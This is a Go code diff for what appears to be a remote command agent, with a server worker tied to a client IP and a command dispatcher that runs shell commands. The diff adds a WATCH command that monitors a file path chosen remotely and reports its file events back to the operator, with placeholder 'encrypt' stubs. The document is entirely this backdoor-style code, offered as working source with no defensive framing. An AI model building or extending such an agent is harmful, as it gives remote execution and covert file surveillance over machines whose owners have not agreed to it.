@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"golang.org/x/exp/inotify"
 	"net/http"
 	"os/exec"
 	"strings"
@@ -9,7 +10,8 @@ import (
 )
 
 const (
-	EXEC byte = 0x1
+	EXEC  byte = 1
+	WATCH byte = 2
 )
 
 func serverWorker(clientIp string) {
@@ -102,6 +104,39 @@ func runCommand(data string, results chan<- string) {
 		result = append(result, 1, seq)
 		results <- encrypt(result)
 
+	case WATCH:
+		// get seq number
+		seq := command[1]
+
+		// cast the data into a file string
+		path := string(command[2:])
+
+		// create watcher
+		watcher, err := inotify.NewWatcher()
+		if err != nil {
+			return
+		}
+
+		// set watch going
+		err = watcher.Watch(path)
+		if err != nil {
+			return
+		}
+
+		// create result header with type and seq
+		resultHeader := make([]byte, 0, 1)
+		resultHeader = append(resultHeader, WATCH, seq)
+
+		// wait on watch or error events from the watcher
+		select {
+		case ev := <-watcher.Event:
+			result := append(resultHeader, []byte(ev.String())...)
+			results <- encrypt(result)
+
+		case err = <-watcher.Error:
+			return
+		}
+
 	}
 
 	//chdir
@@ -113,9 +148,11 @@ func runCommand(data string, results chan<- string) {
 }
 
 func encrypt(data []byte) string {
+	//TODO
 	return string(data)
 }
 
 func decrypt(data string) []byte {
+	//TODO
 	return []byte(data)
 }
